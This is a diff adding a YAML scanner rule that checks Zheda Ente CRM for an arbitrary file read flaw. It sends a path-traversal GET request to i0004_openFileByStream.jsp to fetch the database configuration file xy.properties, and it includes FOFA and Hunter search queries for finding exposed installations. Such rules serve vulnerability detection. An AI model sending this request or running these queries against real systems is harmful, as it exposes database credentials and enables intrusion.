@@ -1,0 +1,15 @@
+name: zdet-fileread
+rules:
+  - method: GET
+    path: /entsoft/module/i0004_openFileByStream.jsp?filepath=/../EnterCRM/bin/xy.properties&filename=conan
+    headers:
+    body: 
+    expression:                          
+      status_code: 200 
+      response_header:  
+      response_body: dbname
+detail:
+  description: "浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口存在任意文件读取漏洞。截至2024/5/31发现较多网站存在该漏洞。"
+  search: 
+    fofa: title="欢迎使用浙大恩特客户资源管理系统"||app="浙大恩特客户资源管理系统"
+    鹰图: web.title="欢迎使用浙大恩特客户资源管理系统"
